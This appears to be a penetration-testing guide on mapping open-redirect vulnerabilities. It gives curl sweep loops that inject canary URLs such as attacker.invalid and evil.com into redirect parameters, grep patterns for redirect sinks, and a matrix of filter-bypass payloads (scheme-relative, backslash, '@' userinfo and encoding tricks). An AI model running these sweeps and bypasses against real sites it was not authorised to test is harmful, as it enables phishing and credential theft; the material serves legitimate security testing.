# Detection (deep) — the full surface-mapping procedure

## The systematic sweep

```text
1. the param vocabulary over the endpoints   -> the 100-name sweep
2. the carrier detection                      -> Location/meta/JS/Refresh
3. the first canary on each carrier          -> the fingerprint
4. the filter-shape read                      -> which arm's failure modes
5. the bypass-arm selection                   -> the filter-shape matrix
6. the uniform-falsifier                      -> the class-close check
7. the chain-route                            -> the laundered-trust
```

## The endpoint × param matrix — the full sweep

```bash
# the endpoint inventory — the redirect-prone flows
ENDPOINTS="/login /logout /signin /signout /register /auth/login /auth/logout \
  /oauth/authorize /oauth/callback /sso /saml/acs /oidc/callback \
  /out /goto /link /r /u /redirect /return /back /previous \
  /error /401 /403 /404 /checkout /payment/success /payment/cancel \
  /img /fetch /proxy /thumb /feed /share /qr /deeplink"

# the param vocabulary
PARAMS="next url redir redirect redirect_uri redirect_url return returnTo \
  returnto return_url goto dest destination target continue out view \
  callback to forward link ref referer site host path location uri \
  post_logout_redirect_uri RelayState relay reply successUrl cancelUrl"

# the matrix — every endpoint × every param, the canary, the Location
for ep in $ENDPOINTS; do
  for p in $PARAMS; do
    loc=$(curl -si --max-time 5 "$BASE$ep?$p=https%3A%2F%2Fattacker.invalid" \
          | grep -i '^location' | head -1)
    [ -n "$loc" ] && echo "$ep ?$p -> $loc"
  done
done
```

## The carrier-detection — which redirect mechanism

```bash
# the Location header
curl -si "$BASE/x?url=https://attacker.invalid" | grep -i '^location'
# the Refresh header
curl -si "$BASE/x?url=https://attacker.invalid" | grep -i '^refresh'
# the meta refresh
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'http-equiv.*refresh|meta.*refresh'
# the JS navigation
curl -s "$BASE/x?url=https://attacker.invalid" | \
  grep -oiE '(window\.)?location(\.(href|replace|assign|hash))?\s*=\s*["'"'"'][^"'"'"']*'
# the DOM-source sink — the bundle
curl -s "$BASE/app.js" | grep -oE 'location\.(href|replace|assign)\s*=\s*[^;]*'
```

## The fingerprint matrix — the Location shape

```text
Location: https://attacker.invalid/landing     <- verbatim canary — CANDIDATE
Location: https://evil.com                     <- the simple host — CANDIDATE
Location: //evil.com                           <- scheme-relative — CANDIDATE
Location: /                                    <- forced-relative — safe arm
Location: /dashboard                           <- fixed safe — safe arm
Location: https://target.com/login             <- allowlisted — safe arm
Location: https://target.com.evil.com          <- a substring-gap — CANDIDATE
Location: https://evil.com/target.com          <- the substring-in-path — CANDIDATE
Location: evil.com                             <- relative — NOT the gap (resolves target.com/evil.com)
Location: https:evil.com                       <- a scheme-no-// — CANDIDATE
no Location                                    <- a weak-negative
```

## The filter-shape fingerprint — which arms to try

| The Location on the canary | The filter | The arms to try |
|---|---|---|
| `Location: /` on `https://evil.com` | a host-block | `//evil.com`, `/\evil.com`, `%5c`, userinfo, subdomain, encoded, `javascript:` |
| `Location: https://target.com/x` | a host-force | `https://target.com@evil.com`, `evil.com\@target.com`, `target.com.evil.com`, `evil.com/target.com` |
| `Location: /` on `//evil.com` too | a `//`-block | `/\evil.com`, `\\evil.com`, `%5c`, `/%2f`, scheme-relative variants |
| `Location: /` on userinfo too | an `@`-block | the encoded `@`, the `\@`, the `?@`, the `#@` |
| `Location: /` on all simple arms | a strong filter | the decode-order, unicode, whitespace, double-encode |

## The two-parser fingerprint — the URL-parse read

```bash
# probe the filter's parser — send a differential arm, read the Location
curl -si "$BASE/login?next=https%3a%2f%2fevil.com%5c.target.com" | grep -i location
# Location: https://evil.com\.target.com  <- the filter kept %5c-decoded
#                                          the browser reads host=evil.com
# Location: /                              <- the filter caught it
```

## The client-side detection — the meta/JS/hash carriers

```bash
# the meta-refresh
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'meta.*refresh'
# the JS-nav
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'location\.|window\.location'
# the DOM-source — the bundle's location.* sink
curl -s "$BASE/app.js" | grep -oE 'location\.(href|replace|assign)\s*=\s*[^;]*'
# the fragment-carried — #next= is client-side only; grep the bundle
curl -s "$BASE/app.js" | grep -oE 'location\.hash[^;]*|new URLSearchParams\(location\.hash\)'
```

## The detection-confidence ladder

```text
the param exists (a name-match)              -> the LOWEST signal
the param reaches a carrier                  -> the surface signal
the carrier returns                          -> the carrier signal
the carrier carries the canary               -> the oracle signal — CANDIDATE
the oracle carries the canary on a bypass    -> the differential signal
the laundered-trust fires                    -> the impact signal
```

## The detection-record

`detect: <endpoint>:<param>: <the-carrier>: <the-fingerprint>: <the-
confidence>` — the param + the carrier + the Location shape + the
confidence rung.
